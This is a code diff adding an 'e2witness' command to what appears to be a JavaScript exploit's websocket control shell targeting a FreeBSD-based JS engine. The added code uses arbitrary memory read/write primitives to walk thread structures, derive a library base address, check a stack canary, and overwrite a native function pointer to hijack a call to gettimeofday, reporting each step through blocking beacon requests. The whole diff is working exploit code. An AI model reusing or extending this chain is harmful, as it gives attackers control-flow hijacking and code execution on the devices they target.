@@ -5433,6 +5433,55 @@ function _startWsShell(){
         break;
       }
 
+      case 'e2witness':{
+        /* v13 - THE ONE-COMMAND E2 WITNESS (the council-delivered chain,
+         * session-49-proven end to end): registry entry (boot-stable) ->
+         * thread record -> struct pthread -> the _thread_list backlink at
+         * +0x40 (residue 0x218) -> lk_base -> canary gate -> THE IDENTIFIED
+         * CALL: gettimeofday at lk+0xB50 (14.10-named-import-proven), RDI =
+         * the pre-zeroed fake scope. FreeBSD copies tv BEFORE tz: the wall
+         * clock lands in our buffer regardless of the tz arg's fate. The
+         * kernel copyout is userland-validated - NO PANIC PATH. Every step
+         * rides a BLOCKING sync beacon - a death at the call moment still
+         * banks the derivation and the scope bytes. */
+        if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
+        function EW(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('E2W-'+s),false);x.send();}catch(e){}}
+        try{
+          var ent=S.absRead(0x10001c8000n,0x20);
+          EW('1 entry, tr=0x'+ent[2].toString(16));
+          var tr=S.absRead(ent[2],0x20);
+          EW('2 tr, pt=0x'+tr[5].toString(16));
+          var pt=S.absRead(tr[5],0x60);
+          var Q=pt[8];
+          EW('3 Q=0x'+Q.toString(16));
+          if((Q&0x3fffn)!==0x218n){reply.err='backlink residue mismatch: 0x'+Q.toString(16);break;}
+          var B=Q-0x6C218n;
+          if(B%0x4000n!==0n){reply.err='base unaligned: 0x'+B.toString(16);break;}
+          EW('4 B=0x'+B.toString(16));
+          var can=S.absRead(B+0x751D0n,8)[0];
+          EW('5 canary=0x'+can.toString(16));
+          if(!(can>0x1000000n)){reply.err='canary fail: 0x'+can.toString(16);break;}
+          reply.base='0x'+B.toString(16);
+          reply.canary='0x'+can.toString(16);
+          var tgt=B+0xB50n;
+          EW('6 CALL 0x'+tgt.toString(16));
+          for(var zw=0;zw<4;zw++)S.absWrite(S.fakeScope+BigInt(zw*8),0n);
+          if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
+          var oFnW=S.absRead(S.neEntry.addr+0x28n,8)[0];
+          S.absWrite(S.neEntry.addr+0x28n,tgt);
+          try{Math.round(-5.7);}catch(e){}
+          S.absWrite(S.neEntry.addr+0x28n,oFnW);
+          if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
+          var w0=S.absRead(S.fakeScope,8)[0],w1=S.absRead(S.fakeScope+8n,8)[0],w2=S.absRead(S.fakeScope+16n,8)[0],w3=S.absRead(S.fakeScope+24n,8)[0];
+          EW('7 SCOPE 0x'+w0.toString(16)+' 0x'+w1.toString(16)+' 0x'+w2.toString(16)+' 0x'+w3.toString(16));
+          reply.scope=['0x'+w0.toString(16),'0x'+w1.toString(16),'0x'+w2.toString(16),'0x'+w3.toString(16)];
+          reply.witness=(w0>0x40000000n&&w0<0x80000000n&&w1<0xF4240n);
+          if(reply.witness)EW('E2 WITNESS LANDED: sec=0x'+w0.toString(16)+' usec=0x'+w1.toString(16));
+          else EW('no witness write');
+        }catch(e2){reply.err='chain fault: '+String(e2&&e2.message?e2.message:'?');}
+        break;
+      }
+
       case 'info':{
         reply.base=S.hex(S.BASE);
         reply.view=S.hex(S.viewBase);
